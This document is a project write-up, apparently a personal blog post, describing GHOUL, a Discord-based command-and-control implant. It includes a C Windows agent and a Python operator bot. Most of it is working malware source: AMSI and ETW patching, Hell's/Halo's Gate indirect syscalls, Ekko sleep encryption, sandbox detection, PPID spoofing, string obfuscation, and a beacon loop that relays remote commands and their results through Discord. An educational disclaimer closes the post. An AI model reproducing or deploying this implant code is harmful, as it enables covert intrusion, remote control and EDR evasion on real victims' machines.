---
title: "GHOUL C2"
description: "Educational Discord-based Command & Control framework — AES-256-GCM encrypted beaconing, per-agent shell channels, and multiple evasion techniques implemented in C and Python."
date: 2026-02-25
tags: ["c", "python", "c2", "malware-research", "evasion", "discord", "windows", "security-research"]
---

## Overview

**GHOUL** is an educational Command & Control (C2) framework built on top of the Discord REST API. The project covers the full stack: a Windows agent written in C, and an operator bot written in Python using discord.py.

The goal was to build something that goes beyond a toy example — implementing real techniques used by modern implants, with every design decision documented and explained. The result is a working C2 with encrypted beaconing, multiple AV/EDR evasion layers, and a per-agent interactive shell system, all over a transport that blends into normal network traffic.

Current version: **alfa_2c**

---

## Architecture

```
[Windows Agent]  ←──── HTTPS/443 (Discord REST API) ────→  [Discord Server]
      ↑                                                            ↑
      │                                                            │
  AES-256-GCM                                              [Python Bot]
  XOR-obfuscated                                         discord.py + SQLite
  WinHTTP (dynamic)                                      operator terminal
```

The agent and the bot never communicate directly. All traffic passes through Discord channels acting as a message bus:

| Channel | Purpose |
|---|---|
| `#checkin` | Agent registration on first run |
| `#cmd` | Operator → Agent commands |
| `#results` | Agent → Operator command output |
| `#shell-{agent_id}` | Per-agent interactive shell (auto-created) |
| `#exfil` | File exfiltration (future) |
| `#logs` | Bot events and errors |

Every message on the wire is AES-256-GCM encrypted and base64-encoded. Discord sees only ciphertext.

---

## Transport Layer

Using Discord as C2 transport has a few practical advantages:

- Communicates exclusively over HTTPS on port 443 — indistinguishable from normal browser traffic at the network level
- Discord's CDN and API servers are on trusted IP ranges (Cloudflare), not flagged by firewalls
- No dedicated infrastructure to spin up or maintain
- Egress filtering rarely blocks `discord.com`

The agent uses **WinHTTP** to make REST calls directly to the Discord API — `GET /channels/{id}/messages` to poll for commands, `POST /channels/{id}/messages` to send results, `DELETE /channels/{id}/messages/{msg_id}` to clean up commands after execution.

The screenshot below shows a Wireshark capture of live C2 traffic — all TLSv1.2 Application Data on port 443, no plaintext, no unusual protocol. From a network perspective it is indistinguishable from any other HTTPS session to Cloudflare infrastructure.

![Wireshark capture — GHOUL C2 traffic over TLS 1.2 port 443](/images/projects/ghoul-wireshark-tls.png)

---

## Encryption — AES-256-GCM

All messages are encrypted with AES-256-GCM before transmission. The shared key is compiled into both the agent and the bot.

**Agent side (C + mbedTLS 3.5.2):**

```c
/* edu_crypto.c — simplified */
int aes_gcm_encrypt(const uint8_t *key,
                    const uint8_t *plaintext, size_t pt_len,
                    uint8_t *ciphertext, size_t *ct_len,
                    uint8_t *iv_out, uint8_t *tag_out)
{
    mbedtls_gcm_context ctx;
    mbedtls_gcm_init(&ctx);
    mbedtls_gcm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key, 256);

    /* Random 12-byte IV per message */
    mbedtls_ctr_drbg_random(&g_drbg, iv_out, 12);

    mbedtls_gcm_crypt_and_tag(&ctx, MBEDTLS_GCM_ENCRYPT,
        pt_len, iv_out, 12, NULL, 0,
        plaintext, ciphertext, 16, tag_out);

    mbedtls_gcm_free(&ctx);
    return 0;
}
```

**Wire format** — base64(IV[12] + TAG[16] + CIPHERTEXT):

```
GHOUL|RESULT|<agent_id>|<base64(iv+tag+ciphertext)>
```

**Bot side (Python + pycryptodome):**

```python
def decrypt_message(b64_payload: str, key: bytes) -> str:
    raw = base64.b64decode(b64_payload)
    iv, tag, ct = raw[:12], raw[12:28], raw[28:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    return cipher.decrypt_and_verify(ct, tag).decode()
```

A fresh random IV is generated for every message, so each ciphertext is unique even if the plaintext repeats.

---

## String Obfuscation — XOR Encoding

Sensitive string constants (channel IDs, API endpoints, command prefixes) are not stored in plaintext. They are XOR-encoded at compile time and decoded at runtime, so they do not appear in strings output or static analysis.

```c
/* edu_xor.h */
#define XOR_KEY 0x4A

static inline void xor_decode(const uint8_t *enc, char *out, size_t len) {
    for (size_t i = 0; i < len; i++)
        out[i] = (char)(enc[i] ^ XOR_KEY);
    out[len] = '\0';
}

/* edu_config.h — channel ID stored as XOR-encoded byte array */
static const uint8_t ENC_CHANNEL_CMD[] = {
    0x7B, 0x7E, 0x7D, ...
};
/* Decoded at runtime: xor_decode(ENC_CHANNEL_CMD, buf, sizeof(ENC_CHANNEL_CMD)) */
```

The agent decodes each constant into a stack buffer only when it needs it, and overwrites the buffer immediately after.

---

## Dynamic IAT — Avoiding Static Imports

Instead of linking against WinHTTP directly (which would leave obvious entries in the Import Address Table), all Windows API functions are resolved at runtime via `GetProcAddress`.

```c
/* edu_http.c */
typedef HINTERNET (WINAPI *fn_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);

HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
fn_WinHttpOpen pOpen = (fn_WinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
```

This removes WinHTTP from the static IAT. A static scanner inspecting the PE import table will not see WinHTTP or any Discord-related string.

---

## Beaconing — Jitter Sleep

The agent polls for commands on a configurable interval with ±40% random jitter, avoiding the fixed-interval pattern that network-based detections look for.

```c
/* edu_main.c */
void jitter_sleep(DWORD base_ms)
{
    /* jitter: ±40% of base interval */
    int range = (int)(base_ms * 0.4);
    int offset = (rand() % (range * 2 + 1)) - range;
    DWORD sleep_ms = (DWORD)(base_ms + offset);

    /* Poll shell channel every 5 seconds during sleep */
    DWORD elapsed = 0;
    while (elapsed < sleep_ms) {
        DWORD chunk = (sleep_ms - elapsed < 5000) ? (sleep_ms - elapsed) : 5000;
        Sleep(chunk);
        elapsed += chunk;
        fast_poll_shell();   /* check dedicated shell channel */
    }
}
```

---

## Sandbox Detection

Before starting the beacon loop, the agent runs a set of environmental checks to detect analysis environments. If two or more checks trigger, the agent exits silently.

```c
/* edu_env_check.c */
int env_check(void)
{
    int score = 0;

    /* 1. Uptime < 10 minutes — sandbox freshly booted */
    if (GetTickCount64() < 600000) score++;

    /* 2. System disk < 60 GB — sandboxes use minimal disk images */
    ULARGE_INTEGER free_bytes, total_bytes, total_free;
    GetDiskFreeSpaceExA("C:\\", &free_bytes, &total_bytes, &total_free);
    if (total_bytes.QuadPart < 60ULL * 1024 * 1024 * 1024) score++;

    /* 3. RAM < 4 GB */
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) score++;

    /* 4. CPU cores < 2 */
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) score++;

    /* 5. Known analysis process running (wireshark, procmon, x64dbg, ...) */
    if (analysis_process_running()) score++;

    return (score >= 2) ? 0 : 1;  /* 0 = abort */
}
```

---

## Sleep Encryption — Ekko Technique

When the agent is sleeping between beacons, its memory is fully readable. AV/EDR scanners walk process memory looking for shellcode signatures, PE headers in RWX regions, and known byte patterns.

Sleep encryption solves this: during the sleep interval, the `.text` section of the agent is encrypted in-place. The scanner sees random bytes.

The implementation is based on the **Ekko** technique by C5pider, using a Windows timer queue to schedule a sequence of operations:

```
T=0ms   → VirtualProtect(.text, RW)          — make code section writable
T=100ms → SystemFunction032(.text, RC4_key)  — encrypt in-place
T=200ms → NtWaitForSingleObject(event, N ms) — sleep while encrypted
T=300ms → SystemFunction032(.text, RC4_key)  — decrypt (RC4 is symmetric)
T=400ms → VirtualProtect(.text, RX)          — restore execute permissions
T=500ms → SetEvent(done)                     — signal main thread
```

The main thread waits in **alertable mode** (`WaitForSingleObjectEx(..., TRUE)`) so it can receive the timer callbacks. During `T=200ms` to `T=300ms`, the memory is encrypted and no scanner can find recognizable patterns.

```c
/* edu_sleep_encrypt.c — RC4 key generation */
BYTE rc4_key[16];
HCRYPTPROV hProv = 0;
CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
CryptGenRandom(hProv, sizeof(rc4_key), rc4_key);
CryptReleaseContext(hProv, 0);

/* Key is randomized each sleep — no static signature possible */
SecureZeroMemory(rc4_key, sizeof(rc4_key));  /* cleared after use */
```

`SystemFunction032` is an undocumented function in `cryptbase.dll`/`advapi32.dll` that performs RC4 in-place on a memory buffer — loaded dynamically, not imported statically.

---

## Indirect Syscalls — Hell's Gate + Halo's Gate

EDR products commonly hook `ntdll.dll` functions at the user-mode level: they replace the first bytes of `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, etc. with a jump to their own inspection code.

Indirect syscalls bypass this by extracting the raw syscall number (SSN) directly from `ntdll.dll` in memory and issuing the syscall instruction manually, never touching the hooked function prologue.

**Hell's Gate** — reads the SSN from the unhooked bytes:

```c
/* edu_hellsgate.c */
WORD get_ssn(PVOID func_addr)
{
    BYTE *p = (BYTE*)func_addr;
    /* Unhooked pattern: mov eax, <SSN>  →  4C 8B D1 B8 XX XX 00 00 */
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
        return *(WORD*)(p + 4);
    return 0;
}
```

**Halo's Gate** — if the target function is hooked (first bytes replaced by `0xE9` JMP), walks neighboring syscall stubs up and down to find an unhooked neighbor, then calculates the SSN by offset:

```c
/* If func is hooked, check adjacent stubs */
for (int i = 1; i <= 32; i++) {
    /* neighbor down (lower SSN) */
    BYTE *down = p - (i * STUB_SIZE);
    if (down[3] == 0xB8) return *(WORD*)(down + 4) + i;

    /* neighbor up (higher SSN) */
    BYTE *up   = p + (i * STUB_SIZE);
    if (up[3]  == 0xB8) return *(WORD*)(up   + 4) - i;
}
```

Once the SSN is known, the syscall is issued from a clean stub in the agent's own memory — the EDR hook is never executed.

---

## AMSI Bypass

The Antimalware Scan Interface (AMSI) allows AV engines to scan content at runtime — scripts, buffers passed to PowerShell, etc. The standard bypass patches `AmsiScanBuffer` in memory to return `AMSI_RESULT_CLEAN` unconditionally.

```c
/* edu_bypass.c */
void patch_amsi(void)
{
    HMODULE h = LoadLibraryA("amsi.dll");
    FARPROC fn = GetProcAddress(h, "AmsiScanBuffer");
    if (!fn) return;

    /*
     * Patch: mov eax, 0x80070057  (E_INVALIDARG → treated as clean)
     *         ret
     * Bytes: B8 57 00 07 80 C3
     */
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old;
    VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, sizeof(patch), old, &old);
}
```

---

## ETW Bypass

Event Tracing for Windows (ETW) is used by EDR products to receive telemetry about process behavior from the kernel. Patching `EtwEventWrite` in `ntdll.dll` causes all ETW events from the agent process to be silently discarded.

```c
/* edu_bypass.c */
void patch_etw(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    FARPROC fn = GetProcAddress(h, "EtwEventWrite");
    if (!fn) return;

    /* Single RET instruction — function returns immediately, logs nothing */
    BYTE patch[] = { 0xC3 };
    DWORD old;
    VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, sizeof(patch), old, &old);
}
```

---

## PPID Spoofing

When a process is created, Windows records which process spawned it. EDR products monitor parent-child relationships: `outlook.exe → cmd.exe` or `word.exe → powershell.exe` are high-confidence alerts.

PPID Spoofing uses `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to make a newly created process appear to be a child of any arbitrary process (e.g., `explorer.exe`), regardless of which process actually called `CreateProcess`.

```c
/* edu_ppid.c */
int create_process_with_ppid(DWORD parent_pid, const char *cmd_line, DWORD *out_pid)
{
    HANDLE h_parent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);

    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
    LPPROC_THREAD_ATTRIBUTE_LIST attr = malloc(attr_size);
    InitializeProcThreadAttributeList(attr, 1, 0, &attr_size);

    UpdateProcThreadAttribute(attr, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &h_parent, sizeof(HANDLE), NULL, NULL);

    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attr;

    PROCESS_INFORMATION pi = {0};
    CreateProcessA(NULL, cmd_buf, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL, (LPSTARTUPINFOA)&si, &pi);

    /* Task Manager shows: cmd.exe (parent: explorer.exe) */
}
```

The target parent process name is defined in the agent profile (`PROFILE_PPID_SPOOF_TARGET`), defaulting to `explorer.exe`.

---

## Per-Agent Shell Channels

Each agent gets a dedicated Discord channel for interactive shell access, auto-created when the agent checks in.

**On checkin (bot side):**

```python
async def _ensure_agent_shell_channel(self, guild, agent_id: str) -> discord.TextChannel:
    name = f"shell-{agent_id}"
    existing = discord.utils.get(guild.text_channels, name=name)
    if existing:
        return existing
    channel = await guild.create_text_channel(name, category=category)
    return channel

async def handle_checkin(self, message):
    # ... parse checkin fields ...
    ch = await self._ensure_agent_shell_channel(guild, agent_id)
    set_agent_shell_channel(agent_id, str(ch.id))
    _agent_shell_channels[ch.id] = agent_id
    # Send setchannel command so agent polls the correct channel
    await send_encrypted_cmd(agent_id, f"setchannel {ch.id}")
```

**Agent receives `setchannel` and updates its polling target:**

```c
/* edu_commands.c */
if (strcmp(cmd, "setchannel") == 0) {
    strncpy(g_ch_shell, args, 63);
    /* Agent now polls args (the new channel ID) for shell commands */
}
```

The screenshot below shows the operator Discord interface — a live shell channel with AD enumeration output (domain groups, domain info) received from the agent in real time.

![GHOUL C2 — Discord shell channel with AD enumeration output](/images/projects/ghoul-discord-shell.png)

**Agent polls the shell channel during jitter sleep** (every 5 seconds):

```c
/* edu_main.c */
void fast_poll_shell(void) {
    if (g_ch_shell[0] == '\0') return;
    /* GET /channels/{g_ch_shell}/messages */
    /* decrypt → execute_command() → send_result_chunks() */
}
```

**Interpreter selection** — the operator prefixes the command with the shell type:

```
cmd ipconfig /all      → runs via cmd.exe
pwsh Get-Process       → runs via powershell.exe -NonInteractive
whoami                 → default (cmd.exe)
```

---

## Multi-Chunk Output

Discord messages have a 2000-character limit. After AES-GCM encryption and base64 encoding, plaintext is roughly 1.65× the ciphertext size. Large command output (e.g., `ps`, `ipconfig /all`) is split into 1200-character chunks before encryption and sent as multiple `RESULT` messages.

```c
/* edu_main.c */
void send_result_chunks(const char *agent_id, const char *output)
{
    size_t len = strlen(output);
    size_t offset = 0;

    while (offset < len) {
        size_t chunk_len = len - offset;
        if (chunk_len > MAX_OUTPUT_DISCORD)
            chunk_len = MAX_OUTPUT_DISCORD;

        char chunk[MAX_OUTPUT_DISCORD + 1] = {0};
        memcpy(chunk, output + offset, chunk_len);

        /* Encrypt and post chunk as RESULT message */
        post_result(agent_id, chunk);
        offset += chunk_len;
    }
}
```

---

## Command Deduplication

The agent deletes each command from the Discord channel after execution (`DELETE /channels/{id}/messages/{msg_id}`). If the delete fails (rate limit, permission issue), the same command would be re-fetched and re-executed on the next poll.

Deduplication prevents this: the agent stores the last executed message ID and skips any command with the same ID, regardless of whether the delete succeeded.

```c
static char g_last_cmd_id[32]      = {0};  /* main command channel */
static char g_last_shell_cmd_id[32] = {0}; /* per-agent shell channel */

/* Before executing: */
if (strcmp(msg_id, g_last_cmd_id) == 0) continue;  /* already executed */
strncpy(g_last_cmd_id, msg_id, sizeof(g_last_cmd_id) - 1);
```

---

## Operator Bot Commands

```
!checkins           — list all registered agents
!cmd <id> <cmd>     — send an encrypted command to an agent
!setshell <id>      — associate current terminal with agent's shell channel
!unsetshell         — detach from shell channel
!kill <id>          — send kill command to agent
!purge_all          — purge all C2 channels
!help               — show this help
```

Shell channel interaction (in `#shell-{agent_id}`):

```
cmd <command>        — execute via cmd.exe
pwsh <command>       — execute via PowerShell
<command>            — execute via default shell
```

---

## Build

```bash
# Release (no console window, -mwindows)
cd agent
make

# Debug (console window visible — for lab testing)
make debug
```

Dependencies: MinGW-w64, mbedTLS 3.5.2 (static), WinHTTP (system).

---

## Project Structure

```
ghoul/
├── agent/
│   ├── edu_main.c            # beacon loop, polling, chunked output
│   ├── edu_commands.c        # command dispatch (shell/cmd/pwsh/setchannel/...)
│   ├── edu_crypto.c          # AES-256-GCM via mbedTLS
│   ├── edu_http.c            # WinHTTP REST client (dynamic IAT)
│   ├── edu_xor.c             # XOR string obfuscation
│   ├── edu_env_check.c       # sandbox detection
│   ├── edu_bypass.c          # AMSI + ETW patches
│   ├── edu_sleep_encrypt.c   # Ekko sleep encryption
│   ├── edu_hellsgate.c       # Hell's Gate + Halo's Gate indirect syscalls
│   ├── edu_ppid.c            # PPID spoofing
│   ├── edu_profile.h         # operator-configurable constants
│   ├── edu_config.h          # XOR-encoded compile-time secrets
│   └── Makefile
│
└── server/
    ├── bot.py                # discord.py bot, operator interface
    ├── agent_manager.py      # SQLite persistence
    ├── commands.py           # valid command list
    ├── config.py             # environment config
    └── logs/                 # session log files
```

---

## Protocol Flow

```
Agent                          Discord                          Bot
  │                               │                              │
  │── POST #checkin (encrypted) ──→                              │
  │                               │←── read #checkin ───────────│
  │                               │                              │ create #shell-{id}
  │                               │──── POST #cmd (setchannel) →│
  │←── GET #cmd ──────────────────│                              │
  │  decrypt → update g_ch_shell  │                              │
  │                               │                              │
  │  [beacon loop]                │                              │
  │←── GET #cmd ──────────────────│                              │
  │  decrypt → execute            │                              │
  │── POST #results (encrypted) ──→                              │
  │                               │←── read #results ───────────│
  │                               │                              │ display output
  │                               │                              │
  │  [jitter sleep, every 5s]     │                              │
  │←── GET #shell-{id} ───────────│                              │
  │  decrypt → execute_command    │                              │
  │── POST #shell-{id} (result) ──→                              │
  │                               │←── read #shell-{id} ────────│
```

---

## Logging

The bot writes a timestamped session log to `server/logs/` on startup. All operator actions, agent events, errors, and discord.py internals are captured:

```python
def _open_log(self):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = LOG_DIR / f"session_{ts}.log"
    handler = logging.FileHandler(path)
    # Attach to both bot logger and discord.py logger
    logging.getLogger("discord").addHandler(handler)
    self._log.addHandler(handler)
```

---

> **Disclaimer:** GHOUL is an educational project built to study C2 architecture, Windows internals, and offensive security techniques. It is intended for authorized security research, red team labs, and CTF contexts only. Always obtain explicit written permission before testing on any system you do not own.
